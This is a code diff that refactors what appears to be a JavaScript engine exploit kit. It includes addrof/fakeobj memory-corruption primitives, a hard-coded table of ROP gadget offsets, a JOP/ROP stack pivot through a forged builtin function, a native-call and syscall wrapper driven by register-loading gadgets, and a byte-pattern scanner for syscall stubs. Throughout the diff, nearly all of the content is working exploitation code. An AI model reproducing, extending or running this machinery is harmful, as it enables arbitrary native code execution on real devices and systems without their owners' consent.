@@ -26,7 +26,7 @@ class BigInt {
               }
 
               lo = value >>> 0
-              hi = (value / 0x100000000) >>> 0
+              hi = Math.floor(value / 0x100000000) >>> 0
             } else {
               BigInt.View.setFloat64(0, value, true)
               
@@ -365,8 +365,6 @@ class BigInt {
   }
 }
 
-BigInt.Zero = new BigInt()
-BigInt.One = new BigInt(1)
 BigInt.View = new DataView(new ArrayBuffer(8))
 
 DataView.prototype.getBigInt = function (byteOffset, littleEndian) {
@@ -394,10 +392,10 @@ var mem = {
   },
   addrof: function (obj) {
     leak_obj.obj = obj
-    return mem.view(leak_obj_addr).getBigInt(0x10, true)
+    return this.view(leak_obj_addr).getBigInt(0x10, true)
   },
   fakeobj: function (addr) {
-    mem.view(leak_obj_addr).setBigInt(0x10, addr, true)
+    this.view(leak_obj_addr).setBigInt(0x10, addr, true)
     return leak_obj.obj
   },
   copy: function (dst, src, sz) {
@@ -479,7 +477,7 @@ var utils = {
 
     bytes[str.length] = 0
 
-    return utils.get_backing(bytes)
+    return this.get_backing(bytes)
   },
   get_backing: function(view) {
     return mem.view(mem.addrof(view)).getBigInt(0x10, true)
@@ -500,7 +498,6 @@ var fn = {
 
     var id
     var addr
-    var syscall = false
     if (input instanceof BigInt) {
       addr = input
     } else if (typeof input === 'number') {
@@ -510,90 +507,13 @@ var fn = {
 
       id = new BigInt(input)
       addr = syscalls.map.get(input)
-      syscall = true
-    } 
-
-    var f = function () {
-      if (arguments.length > 6) {
-        throw new Error('More than 6 arguments is not supported !!')
-      }
-
-      var insts = []
-
-      var regs = [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_JO_RET]
-
-      insts.push(gadgets.POP_RAX_RET)
-      insts.push(syscall ? id : BigInt.Zero)
-
-      for (var i = 0; i < arguments.length; i++) {
-        var reg = regs[i]
-        var value = arguments[i]
-
-        insts.push(reg)
-
-        switch (typeof value) {
-          case 'boolean':
-          case 'number':
-            value = new BigInt(value)
-            break
-          case 'string':
-            value = utils.cstr(value)
-            break
-          default:
-            if (!(value instanceof BigInt)) {
-              throw new Error(`Invalid value at arg ${i}`)
-            }
-            break
-        }
-
-        insts.push(value)
-      }
-
-      insts.push(addr)
-
-      var store_size = ret ? 0x10 : 8
-      var store_addr = mem.malloc(store_size)
-
-      if (ret) {
-        rop.store(insts, store_addr, 1)
-      }
-
-      rop.execute(insts, store_addr, store_size)
-
-      var result
-      if (ret) {
-        result = mem.view(store_addr).getBigInt(8, true)
-
-        if (syscall) {
-          if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
-            var errno_addr = fn._error()
-            var errno = mem.view(errno_addr).getUint32(0, true)
-            var str = fn.strerror(errno)
-
-            throw new Error(`${name} returned errno ${errno}: ${str}`)
-          }
-        }
-
-        switch(ret) {
-            case 'bigint':
-              break
-            case 'boolean':
-              result = result.eq(BigInt.One)
-              break
-            case 'string':
-              result = utils.str(result)
-              break
-            default:
-              throw new Error(`Unsupported return type ${ret}`)
-          }
-      }
-
-      return result
     }
 
-    Object.defineProperty(f, 'addr', { value: addr })
+    var f = this.wrapper.bind({id: id, addr: addr, ret: ret })
 
-    fn[name] = f
+    f.addr = addr
+
+    this[name] = f
   },
   unregister (name) {
     if (!(name in this)) {
@@ -601,39 +521,117 @@ var fn = {
       return false
     }
 
-    delete fn[name]
+    delete this[name]
 
     return true
+  },
+  // not intended to be called directly
+  wrapper: function () {
+    if (arguments.length > 6) {
+      throw new Error('More than 6 arguments is not supported !!')
+    }
+
+    var insts = []
+
+    var regs = [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_JO_RET]
+
+    insts.push(gadgets.POP_RAX_RET)
+    insts.push(this.id || 0)
+
+    for (var i = 0; i < arguments.length; i++) {
+      var reg = regs[i]
+      var value = arguments[i]
+
+      insts.push(reg)
+
+      switch (typeof value) {
+        case 'boolean':
+        case 'number':
+          value = new BigInt(value)
+          break
+        case 'string':
+          value = utils.cstr(value)
+          break
+        default:
+          if (!(value instanceof BigInt)) {
+            throw new Error(`Invalid value at arg ${i}`)
+          }
+          break
+      }
+
+      insts.push(value)
+    }
+
+    insts.push(this.addr)
+
+    var store_size = this.ret ? 0x10 : 8
+    var store_addr = mem.malloc(store_size)
+
+    if (this.ret) {
+      rop.store(insts, store_addr, 1)
+    }
+
+    rop.execute(insts, store_addr, store_size)
+
+    var result
+    if (this.ret) {
+      result = mem.view(store_addr).getBigInt(8, true)
+
+      if (this.id) {
+        if (result.eq(-1)) {
+          var errno_addr = this._error()
+          var errno = mem.view(errno_addr).getUint32(0, true)
+          var str = this.strerror(errno)
+
+          throw new Error(`${name} returned errno ${errno}: ${str}`)
+        }
+      }
+
+      switch(this.ret) {
+          case 'bigint':
+            break
+          case 'boolean':
+            result = result.eq(1)
+            break
+          case 'string':
+            result = utils.str(result)
+            break
+          default:
+            throw new Error(`Unsupported return type ${this.ret}`)
+        }
+    }
+
+    return result
   }
 }
 
 var gadgets = {
   init: function (base) {
-    gadgets.RET = base.add(0x4C)
-    gadgets.POP_R10_RET = base.add(0x19E297C)
-    gadgets.POP_R12_RET = base.add(0x3F3231)
-    gadgets.POP_R14_RET = base.add(0x15BE0A)
-    gadgets.POP_R15_RET = base.add(0x93CD7)
-    gadgets.POP_R8_RET = base.add(0x19BFF1)
-    gadgets.POP_R9_JO_RET = base.add(0x72277C)
-    gadgets.POP_RAX_RET = base.add(0x54094)
-    gadgets.POP_RBP_RET = base.add(0xC7)
-    gadgets.POP_RBX_RET = base.add(0x9D314)
-    gadgets.POP_RCX_RET = base.add(0x2C3DF3)
-    gadgets.POP_RDI_RET = base.add(0x93CD8)
-    gadgets.POP_RDX_RET = base.add(0x3A3DA2)
-    gadgets.POP_RSI_RET = base.add(0xCFEFE)
-    gadgets.POP_RSP_RET = base.add(0xC89EE)
-    gadgets.LEAVE_RET = base.add(0x50C33)
-    gadgets.MOV_RAX_QWORD_PTR_RDI_RET = base.add(0x36073)
-    gadgets.MOV_QWORD_PTR_RDI_RAX_RET = base.add(0x27FD0) 
-    gadgets.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40 = base.add(0x46E8F0)
-    gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18 = base.add(0x3F6F70)
-    gadgets.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10 = base.add(0x18B3B5)
-    gadgets.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22 = base.add(0x1E25AA1)
-    gadgets.PUSH_RBP_POP_RCX_RET = base.add(0x1737EEE)
-    gadgets.MOV_RAX_RCX_RET = base.add(0x41015)
-    gadgets.PUSH_RAX_POP_RBP_RET = base.add(0x4E82B9)
+    this.RET = base.add(0x4C)
+    this.POP_R10_RET = base.add(0x19E297C)
+    this.POP_R12_RET = base.add(0x3F3231)
+    this.POP_R14_RET = base.add(0x15BE0A)
+    this.POP_R15_RET = base.add(0x93CD7)
+    this.POP_R8_RET = base.add(0x19BFF1)
+    this.POP_R9_JO_RET = base.add(0x72277C)
+    this.POP_RAX_RET = base.add(0x54094)
+    this.POP_RBP_RET = base.add(0xC7)
+    this.POP_RBX_RET = base.add(0x9D314)
+    this.POP_RCX_RET = base.add(0x2C3DF3)
+    this.POP_RDI_RET = base.add(0x93CD8)
+    this.POP_RDX_RET = base.add(0x3A3DA2)
+    this.POP_RSI_RET = base.add(0xCFEFE)
+    this.POP_RSP_RET = base.add(0xC89EE)
+    this.LEAVE_RET = base.add(0x50C33)
+    this.MOV_RAX_QWORD_PTR_RDI_RET = base.add(0x36073)
+    this.MOV_QWORD_PTR_RDI_RAX_RET = base.add(0x27FD0) 
+    this.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40 = base.add(0x46E8F0)
+    this.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18 = base.add(0x3F6F70)
+    this.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10 = base.add(0x18B3B5)
+    this.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22 = base.add(0x1E25AA1)
+    this.PUSH_RBP_POP_RCX_RET = base.add(0x1737EEE)
+    this.MOV_RAX_RCX_RET = base.add(0x41015)
+    this.PUSH_RAX_POP_RBP_RET = base.add(0x4E82B9)
   }
 }
 
@@ -649,35 +647,35 @@ var rop = {
 
     gadgets.init(addr)
 
-    rop.jop_stack_store = mem.malloc(8)
-    rop.jop_stack_addr = mem.malloc(0x6A)
-    rop.stack_addr = mem.malloc(rop.base * 2)
+    this.jop_stack_store = mem.malloc(8)
+    this.jop_stack_addr = mem.malloc(0x6A)
+    this.stack_addr = mem.malloc(this.base * 2)
 
-    var jop_stack_base_addr = rop.jop_stack_addr.add(0x22)
+    var jop_stack_base_addr = this.jop_stack_addr.add(0x22)
 
-    mem.view(rop.jop_stack_addr).setBigInt(0, gadgets.POP_RSP_RET, true)
-    mem.view(jop_stack_base_addr).setBigInt(0, rop.stack_addr.add(rop.base), true)
+    mem.view(this.jop_stack_addr).setBigInt(0, gadgets.POP_RSP_RET, true)
+    mem.view(jop_stack_base_addr).setBigInt(0, this.stack_addr.add(this.base), true)
     mem.view(jop_stack_base_addr).setBigInt(0x10, gadgets.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22, true)
     mem.view(jop_stack_base_addr).setBigInt(0x18, gadgets.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10, true)
     mem.view(jop_stack_base_addr).setBigInt(0x40, gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18, true)
 
-    mem.view(rop.jop_stack_store).setBigInt(0, jop_stack_base_addr, true)
+    mem.view(this.jop_stack_store).setBigInt(0, jop_stack_base_addr, true)
 
-    rop.fake = rop.fake_builtin(gadgets.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40)
-    rop.reset()
+    this.fake = this.fake_builtin(gadgets.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40)
+    this.reset()
 
     log('Achieved ROP !!')
   },
   reset: function () {
-    rop.idx = rop.base
+    this.idx = this.base
   },
   push: function (value) {
-    if (rop.idx > rop.base * 2) {
+    if (this.idx > this.base * 2) {
       throw new Error('Stack full !!')
     }
 
-    mem.view(rop.stack_addr).setBigInt(rop.idx, value, true)
-    rop.idx += 8
+    mem.view(this.stack_addr).setBigInt(this.idx, value, true)
+    this.idx += 8
   },
   execute: function (insts, store_addr, store_size) {
     if (store_size % 8 !== 0) {
@@ -692,25 +690,25 @@ var rop = {
 
     header.push(gadgets.PUSH_RBP_POP_RCX_RET)
     header.push(gadgets.MOV_RAX_RCX_RET)
-    rop.store(header, store_addr, 0)
+    this.store(header, store_addr, 0)
 
     var footer = []
 
-    rop.load(footer, store_addr, 0)
+    this.load(footer, store_addr, 0)
     footer.push(gadgets.PUSH_RAX_POP_RBP_RET)
     footer.push(gadgets.POP_RAX_RET)
-    footer.push(BigInt.Zero)
+    footer.push(0)
     footer.push(gadgets.LEAVE_RET)
 
     insts = header.concat(insts).concat(footer)
 
     for (var inst of insts) {
-      rop.push(inst)
+      this.push(inst)
     }
 
-    rop.fake(0, 0, 0, mem.fakeobj(rop.jop_stack_store))
+    this.fake(0, 0, 0, mem.fakeobj(this.jop_stack_store))
 
-    rop.reset()
+    this.reset()
   },
   fake_builtin: function (addr) {
     function fake () {}
@@ -745,11 +743,15 @@ var rop = {
 
 var struct = {
   register: function (name, fields) {
+    if (!Array.isArray(fields) || fields.length === 0) {
+      throw new Error(`Empty fields array !!`)
+    }
+
     if (name in this) {
       throw new Error(`${name} already registered in struct !!`)
     }
 
-    var [sizeof, infos] = struct.parse(fields)
+    var [sizeof, infos] = this.parse(fields)
 
     var cls = class {                    
       constructor(addr) {
@@ -764,7 +766,7 @@ var struct = {
     cls.fields = fields
 
     for (var info of infos) {
-      struct.define_property(cls, info)
+      this.define_property(cls, info)
     }
   },
   unregister: function (name) {
@@ -780,7 +782,9 @@ var struct = {
     var infos = []
     var offset = 0
     var struct_alignment = 1
-    for (var field of fields) {
+    for (var i = 0; i < fields.length; i++) {
+      var field = fields[i]
+
       var size = 0
       var alignment = 0
       var pointer = false
@@ -793,7 +797,7 @@ var struct = {
           alignment = 8
           pointer = true
       } else if (type in this) {
-        size = this[type].sizeof   
+        size = this[type].sizeof
       } else {
         var bits = type.replace(/\D/g, '')
         if (bits % 8 !== 0) {
@@ -966,8 +970,8 @@ var struct = {
 }
 
 var syscalls = {
-  pattern: [0x48, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0x49, 0x89, 0xCA, 0x0F, 0x05],
   map: new Map(),
+  pattern: [0x48, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0x49, 0x89, 0xCA, 0x0F, 0x05],
   init: function (addr) {
     var offset = 0
     var count = 0x40000
@@ -978,14 +982,14 @@ var syscalls = {
     var pattern_idx = 0
     while (offset < count) {
       var b = view.getUint8(offset)
-      var c = syscalls.pattern[pattern_idx]
+      var c = this.pattern[pattern_idx]
       if (b === c || (c === 0xFF && b < c)) {
         if (pattern_idx === 0) {
           start_offset = offset
-        } else if (pattern_idx === syscalls.pattern.length - 1) {
+        } else if (pattern_idx === this.pattern.length - 1) {
           var id = view.getInt32(start_offset + 3, true)
 
-          syscalls.map.set(id, addr.add(start_offset))
+          this.map.set(id, addr.add(start_offset))
 
           pattern_idx = 0
           continue
